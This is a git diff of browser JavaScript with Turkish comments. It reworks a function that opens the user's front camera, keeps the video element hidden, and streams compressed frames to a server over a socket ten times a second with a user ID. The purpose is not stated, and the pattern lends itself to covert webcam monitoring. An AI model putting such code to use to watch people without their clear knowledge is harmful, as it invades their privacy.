@@ -21,58 +21,67 @@ let videoFrameInterval = null;
 // Video yayınını başlat
 function startVideoStream(socket) {
   if (videoStreamActive) return;
-  
+
   // Canvas ve context oluştur
   videoCanvas = document.createElement('canvas');
-  videoCanvas.width = 320;  // Düşük çözünürlük için
+  videoCanvas.width = 320;
   videoCanvas.height = 240;
   videoCanvasCtx = videoCanvas.getContext('2d');
-  
+
   // Kamera erişimi iste
-  navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
-    .then(stream => {
-      videoStream = stream;
-      videoStreamActive = true;
-      
-      // Gizli video elementi oluştur
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.autoplay = true;
-      
-      // Her 500ms'de bir frame gönder - ağ yükünü azaltmak için
-      videoFrameInterval = setInterval(() => {
-        if (!videoStreamActive) return;
-        
-        // Video frame'i canvas'a çiz
-        videoCanvasCtx.drawImage(video, 0, 0, videoCanvas.width, videoCanvas.height);
-        
-        // Frame'i base64 olarak kodla ve gönder
-        const imageData = videoCanvas.toDataURL('image/jpeg', 0.5); // Kaliteyi düşürerek veri boyutunu azalt
-        
-        if (socket && socket.connected) {
-          socket.emit('video_frame', {
-            userId: clientInfo.userId || 'anonymous',
-            frame: imageData,
-            timestamp: Date.now()
-          });
-        }
-      }, 500);
-      
-      // Video stream başlatıldı logunu gönder
-      sendClientLog({
-        type: "video_stream_started",
-        timestamp: Date.now()
-      });
-    })
-    .catch(err => {
-      console.error("Kamera erişimi hatası:", err);
-      sendClientLog({
-        type: "video_stream_error",
-        error: err.message,
-        timestamp: Date.now()
-      });
+  navigator.mediaDevices.getUserMedia({
+    video: {
+      width: { ideal: 320 },
+      height: { ideal: 240 },
+      frameRate: { ideal: 10, max: 15 },
+      facingMode: "user"  // Ön kamera tercih edilir
+    },
+    audio: false
+  }).then(stream => {
+    videoStream = stream;
+    videoStreamActive = true;
+
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.autoplay = true;
+    video.playsInline = true;
+    video.muted = true;  // Sessiz çalışması için
+    video.style.display = "none"; // Geliştirme için "block" yapabilirsin
+
+    document.body.appendChild(video); // DOM’a ekle (gerekirse gizle)
+
+    // Her 100ms'de bir frame gönder (10 fps)
+    videoFrameInterval = setInterval(() => {
+      if (!videoStreamActive) return;
+
+      videoCanvasCtx.drawImage(video, 0, 0, videoCanvas.width, videoCanvas.height);
+
+      const imageData = videoCanvas.toDataURL('image/jpeg', 0.3); // Kaliteyi azalt
+
+      if (socket && socket.connected) {
+        socket.emit('video_frame', {
+          userId: clientInfo?.userId || 'anonymous',
+          frame: imageData,
+          timestamp: Date.now()
+        });
+      }
+    }, 100);
+
+    sendClientLog({
+      type: "video_stream_started",
+      timestamp: Date.now()
     });
+
+  }).catch(err => {
+    console.error("🎥 Kamera erişimi hatası:", err);
+    sendClientLog({
+      type: "video_stream_error",
+      error: err.message,
+      timestamp: Date.now()
+    });
+  });
 }
+
 
 // Video yayınını durdur
 function stopVideoStream() {
